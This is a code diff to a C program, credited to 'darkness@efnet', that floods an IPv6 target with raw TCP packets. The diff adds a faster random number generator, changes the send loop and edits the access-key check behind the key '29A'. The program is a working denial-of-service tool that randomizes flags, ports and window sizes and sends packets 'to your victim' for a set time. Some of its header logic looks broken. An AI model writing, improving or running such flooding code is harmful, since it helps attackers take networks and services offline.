@@ -48,14 +48,15 @@ By darkness@efnet
 #include <stdbool.h>
 
 #define ENDIAN_LITTLE
+#define PHI                           0xedc12       // Number generation seed
 
+// Variables
+static uint32_t Q[4096], c = 518267;
 int rawsock = 0;
 unsigned int start;
 unsigned long long packets = 0;
 unsigned short databytes = 0;
 static struct sockaddr_in6 ss;
-
-// TCP stuff
 unsigned long a_flags[11];
 
 struct tcphdr2
@@ -72,11 +73,6 @@ struct tcphdr2
     unsigned short th_urp;         /* urgent pointer */
 };
 
-/*struct pshdr
-{
-    unsigned int src;
-    unsigned int dst;
-}*/
 
 int lookup6(char* addr)
 {
@@ -99,9 +95,40 @@ int lookup6(char* addr)
     return 0;
 }
 
+// Better number randomization function.
+uint32_t rand_cmwc(void)
+{
+    uint64_t t, a = 18782LL;
+    static uint32_t i = 4095;
+    uint32_t x, r = 0xfffffffe;
+    i = (i + 1) & 4095;
+    t = a * Q[i] + c;
+    c = (t >> 32);
+    x = t + c;
+    if (x < c)
+    {
+        x++;
+        c++;
+    }
+    return (Q[i] = r - x);
+}
+
+// Seeding function for our rand number generator.
+void init_rand(uint32_t x)
+{
+    int i;
+
+    Q[0] = x;
+    Q[1] = x + PHI;
+    Q[2] = x + PHI + PHI;
+
+    for (i = 3; i < 4096; i++)
+        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+}
+
 void handle_exit()
 {
-    printf("\n-> Flood completed, %u packets sent, %zu seconds, %zu packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
+    printf("-> Flood completed, %llu packets sent, %zu seconds, %llu packets/sec.\n", packets, time(NULL) - start, packets / (time(NULL) - start));
     exit(0);
 }
 
@@ -158,60 +185,59 @@ void attack(unsigned short dstport, unsigned short srcport, unsigned short flags
     /* Start the attack loop */
     while (true)
     {
+        /* Attack timer check */
+        if (time(NULL) - start >= ttime)
+            handle_exit();
+
+        /* Send the packet to your victim */
+        sendto(rawsock, packet, sizeof(struct tcphdr2), 0, (struct sockaddr*)&ss, sizeof(struct sockaddr_in6)), packets++;
 
         /* If 32 or 33 is specified as a flag, randomize from the chosen flag array */
         if (flags == 32)
         {
-            tcp->th_flags = a_flags[(rand() % 10) + 1];
+            tcp->th_flags = a_flags[(rand_cmwc() % 10) + 1];
         }
         else if (flags == 33)
         {
-            tcp->th_flags = a_flags[(rand() % 11) + 1];
+            tcp->th_flags = a_flags[(rand_cmwc() % 11) + 1];
         }
         // Set ACK and SEQ accordingly.
         switch (tcp->th_flags)
         {
-        case 2:
-        {
-            tcp->th_flags = htonl(0);
-            tcp->th_flags = htonl(0);
-        }
-        default:
-        {
-            tcp->th_flags = htonl(rand());
-            tcp->th_flags = htonl(rand());
-        }
+            case 2:
+            {
+                tcp->th_flags = htonl(0);
+                tcp->th_flags = htonl(0);
+            }
+            default:
+            {
+                tcp->th_flags = htonl(rand_cmwc());
+                tcp->th_flags = htonl(rand_cmwc());
+            }
         }
         /* Randomized win sizes. */
         if (winsize == 1)
         {
-            tcp->th_win = htons((rand() % 40000) + 25535);
+            tcp->th_win = htons((rand_cmwc() % 40000) + 25535);
         }
         /* Random source ports. */
         if (srcport == 0)
         {
-            tcp->th_sport = htons((rand() % 65534) + 1);
+            tcp->th_sport = htons((rand_cmwc() % 65534) + 1);
         }
         else if (srcport == 1)
         {
-            tcp->th_sport = htons(((rand() % 16383) + 49152));
+            tcp->th_sport = htons(((rand_cmwc() % 16383) + 49152));
         }
         /* Random destination ports. */
         if (dstport == 0)
         {
-            tcp->th_dport = htons((rand() % 65534) + 1);
+            tcp->th_dport = htons((rand_cmwc() % 65534) + 1);
         }
         else if (dstport == 1)
         {
-            tcp->th_dport = htons(((rand() % 16383) + 49152));
+            tcp->th_dport = htons(((rand_cmwc() % 16383) + 49152));
         }
-        /* Send the packet to your victim */
-        sendto(rawsock, packet, sizeof(struct tcphdr2), 0, (struct sockaddr*)&ss, sizeof(struct sockaddr_in6));
-        /* Increment the number of packets sent after a successful iteration */
-        packets++;
-        /* Attack timer check */
-        if (time(NULL) - start >= ttime)
-            handle_exit();
     }
 }
 
@@ -221,18 +247,20 @@ int main(int argc, char** argv)
     unsigned short dstport, srcport, winsize;
     unsigned char flags;
 
-    /* parse arguments */
-    if (argc < 6)
+    // Parse arguments.
+    if (argv[1] == NULL || !strcmp(argv[1], "") || strcmp(argv[1], "29A"))
     {
-        printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper.\n");
-        printf("-> usage: %s <key> <dest> <destport: 0> <srcport: 0> <flags: 32> <winsize: 1> <time: seconds>\n", argv[0]);
+        printf("-> Ah ah ah! You didn't say the magic word, deleting system file!\n");
         exit(0);
     }
-
-    if (strcmp(argv[1], "29A"))
+    else
     {
-        printf("-> Ah ah ah! You didn't say the magic word!\n");
-        exit(0);
+        if (argc < 6)
+        {
+            printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper.\n");
+            printf("-> usage: %s <key> <dest> <destport: 0> <srcport: 0> <flags: 32> <winsize: 1> <time: seconds>\n", argv[0]);
+            exit(0);
+        }
     }
 
     /* allocate socket */
@@ -256,6 +284,9 @@ int main(int argc, char** argv)
     signal(SIGQUIT, handle_exit);
 
     start = time(NULL);
+
+    // Seed num generation code.
+    init_rand(time(NULL));
 
     attack(dstport, srcport, flags, winsize, ttime);
 }
